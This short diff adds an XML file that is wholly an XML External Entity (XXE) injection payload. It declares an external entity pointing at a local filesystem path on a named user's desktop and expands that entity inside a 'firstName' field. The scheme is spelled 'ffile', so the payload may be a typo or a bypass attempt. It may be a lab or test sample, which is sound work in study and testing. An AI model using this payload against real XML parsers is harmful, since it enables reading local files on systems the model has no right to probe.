@@ -1,0 +1,6 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "ffile:///home/navneeet/Desktop/"> ]>
+<userInfo>
+ <firstName>&ent;</firstName>
+ <lastName>Singh</lastName>
+</userInfo>
